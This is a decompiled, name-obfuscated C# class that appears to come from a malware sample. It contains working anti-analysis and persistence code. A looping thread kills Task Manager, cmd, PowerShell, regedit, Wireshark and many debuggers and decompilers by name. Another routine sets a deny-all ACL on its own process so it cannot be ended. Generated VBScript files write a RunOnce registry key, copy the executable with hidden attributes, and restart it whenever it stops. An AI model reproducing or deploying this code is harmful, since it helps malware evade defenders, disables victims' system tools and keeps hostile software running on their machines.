using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal sealed class Class53
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class54
	{
		public static readonly Class54 class54_0 = new Class54();

		public static ThreadStart threadStart_0;

		internal void method_0()
		{
			string[] array = new string[107]
			{
				"Taskmgr", "ProcessHacker", "cmd", "powershell", "regedit", "CCleaner", "Wireshark", "procmon64", "codecracker", "x96dbg",
				"pizza", "pepper", "reverse", "reversal", "de4dot", "pc-ret", "crack", "ILSpy", "x32dbg", "sharpod",
				"x64dbg", "x32_dbg", "x64_dbg", "debug", "dbg", "strongod", "PhantOm", "titanHide", "scyllaHide", "ilspy",
				"graywolf", "simpleassemblyexplorer", "MegaDumper", "megadumper", "X64NetDumper", "x64netdumper", "HxD", "hxd", "PETools", "petools",
				"Protection_ID", "protection_id", "die", "process hacker 2", "process", "hacker", "ollydbg", "x32dbg", "x64dbg", "ida -",
				"charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark", "proxifier", "mitmproxy",
				"process hacker", "process monitor", "process hacker 2", "system explorer", "systemexplorer", "systemexplorerservice", "WPE PRO", "ghidra", "folderchangesview", "pc-ret",
				"folder", "dump", "proxy", "de4dotmodded", "StringDecryptor", "Centos", "SAE", "monitor", "brute", "checker",
				"zed", "sniffer", "http", "debugger", "james", "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg",
				"ida -", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx",
				"mdbg", "gdb", "windbg", "dbgclr", "kdb", "kgdb", "mdb"
			};
			while (true)
			{
				Thread.Sleep(50);
				try
				{
					string[] array2 = array;
					for (int i = 0; i < array2.Length; i++)
					{
						Process[] processesByName = Process.GetProcessesByName(array2[i]);
						for (int j = 0; j < processesByName.Length; j++)
						{
							processesByName[j].Kill();
						}
					}
				}
				catch (Exception ex)
				{
					Console.Write("AntiKiller: " + ex.ToString());
				}
			}
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	public static RawSecurityDescriptor smethod_0(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[2];
		uint lpnLengthNeeded = 0u;
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, ref lpnLengthNeeded);
		pSecurityDescriptor = new byte[lpnLengthNeeded + 1];
		if ((long)lpnLengthNeeded >= 0L && (long)lpnLengthNeeded <= 32767L)
		{
			if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, lpnLengthNeeded, ref lpnLengthNeeded))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		throw new Win32Exception();
	}

	public static void smethod_1(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength - 1 + 1];
		dacl.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public static void smethod_2()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			object obj = smethod_0(currentProcess);
			NewLateBinding.LateCall(NewLateBinding.LateGet(obj, (Type)null, "DiscretionaryAcl", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "InsertAce", new object[2]
			{
				0,
				new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null)
			}, (string[])null, (Type[])null, (bool[])null, true);
			smethod_1(currentProcess, (RawSecurityDescriptor)obj);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3(string name, string tpath)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution2.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution2.vbs");
		}
		string value = "on error resume next\r\nDo While True\r\n\r\nSet oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv\")\r\noReg.GetStringValue &H80000001, \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\", \"" + name + "\", strValue\r\nIf IsNull(strValue) Then\r\n\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\" + name + "\", \"" + tpath + "\"\r\nset filesys = CreateObject(\"Scripting.FileSystemObject\")\r\nfilesys.CopyFile\"" + Process.GetCurrentProcess().MainModule!.FileName + "\", \"" + tpath + "\"\r\nset f = filesys.GetFile(\"" + tpath + "\")\r\nf.attributes = 7\r\nEnd If\r\nWScript.Sleep 1000\r\nLoop";
		StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution2.vbs");
		streamWriter.Write(value);
		streamWriter.Close();
		Process.Start(Interaction.Environ("localappdata") + "\\Execution2.vbs");
	}

	public static void smethod_4(string name, string tpath)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution5.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution5.vbs");
		}
		string value = "on error resume next\r\nset objWMIService = GetObject (\"winmgmts:\")\r\nfoundProc = False\r\nprocName = \"" + name + "\"\r\nDo While True\r\nfor each Process in objWMIService.InstancesOf (\"Win32_Process\")\r\nIf StrComp(Process.Name,procName,vbTextCompare) = 0 then\r\nfoundProc = True\r\nEnd If\r\nNext\r\nIf foundProc = False Then\r\nCreateObject(\"WScript.Shell\").Run(\"\"\"" + tpath + "\"\"\") \r\nEnd If\r\nfoundProc = False\r\nWScript.Sleep 1000\r\nLoop";
		StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution5.vbs");
		streamWriter.Write(value);
		streamWriter.Close();
		Process.Start(Interaction.Environ("localappdata") + "\\Execution5.vbs");
	}

	public static void smethod_5()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			string[] array = new string[107]
			{
				"Taskmgr", "ProcessHacker", "cmd", "powershell", "regedit", "CCleaner", "Wireshark", "procmon64", "codecracker", "x96dbg",
				"pizza", "pepper", "reverse", "reversal", "de4dot", "pc-ret", "crack", "ILSpy", "x32dbg", "sharpod",
				"x64dbg", "x32_dbg", "x64_dbg", "debug", "dbg", "strongod", "PhantOm", "titanHide", "scyllaHide", "ilspy",
				"graywolf", "simpleassemblyexplorer", "MegaDumper", "megadumper", "X64NetDumper", "x64netdumper", "HxD", "hxd", "PETools", "petools",
				"Protection_ID", "protection_id", "die", "process hacker 2", "process", "hacker", "ollydbg", "x32dbg", "x64dbg", "ida -",
				"charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark", "proxifier", "mitmproxy",
				"process hacker", "process monitor", "process hacker 2", "system explorer", "systemexplorer", "systemexplorerservice", "WPE PRO", "ghidra", "folderchangesview", "pc-ret",
				"folder", "dump", "proxy", "de4dotmodded", "StringDecryptor", "Centos", "SAE", "monitor", "brute", "checker",
				"zed", "sniffer", "http", "debugger", "james", "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg",
				"ida -", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx",
				"mdbg", "gdb", "windbg", "dbgclr", "kdb", "kgdb", "mdb"
			};
			while (true)
			{
				Thread.Sleep(50);
				try
				{
					string[] array2 = array;
					for (int i = 0; i < array2.Length; i++)
					{
						Process[] processesByName = Process.GetProcessesByName(array2[i]);
						for (int j = 0; j < processesByName.Length; j++)
						{
							processesByName[j].Kill();
						}
					}
				}
				catch (Exception ex)
				{
					Console.Write("AntiKiller: " + ex.ToString());
				}
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
	}
}
